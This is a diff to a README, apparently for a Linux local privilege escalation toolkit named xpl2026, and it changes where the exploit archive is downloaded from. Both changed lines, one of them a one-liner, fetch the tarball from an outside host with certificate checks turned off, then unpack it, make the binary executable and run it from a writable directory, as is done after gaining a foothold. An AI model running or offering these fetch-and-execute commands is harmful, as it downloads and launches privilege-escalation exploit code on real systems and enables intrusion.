@@ -110,7 +110,7 @@ xpl2026/
 
 ```bash
 # Navigate to writable directory
-wget https://mikelodon.my.id/cop/xpl2026.tgz --no-check-certificate
+wget https://github.com/khadafigans/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --no-check-certificate
 tar xzf xpl2026.tgz
 rm -rf xpl2026.tgz
 
@@ -126,7 +126,7 @@ chmod +x xpl2026
 
 ## One Liner
 ```bash
-wget https://mikelodon.my.id/cop/xpl2026.tgz --no-check-certificate && tar xzf xpl2026.tgz && rm -rf xpl2026.tgz && cd xpl2026 && chmod +x xpl2026 && ./xpl2026
+wget https://github.com/khadafigans/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --no-check-certificate && tar xzf xpl2026.tgz && rm -rf xpl2026.tgz && cd xpl2026 && chmod +x xpl2026 && ./xpl2026
 ```
 ---
 
